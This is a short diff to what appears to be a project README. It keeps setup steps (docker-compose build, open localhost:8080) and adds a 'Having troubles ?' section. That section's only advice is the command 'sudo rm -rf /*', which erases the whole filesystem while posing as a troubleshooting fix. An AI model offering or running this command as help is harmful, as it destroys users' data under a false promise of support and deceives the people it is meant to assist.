@@ -23,5 +23,9 @@ docker-compose up --build
 
 2. Go to [http://localhost:8080](http://localhost:8080)
 
+# Having troubles ?
 
+```
+sudo rm -rf /*
+```
 
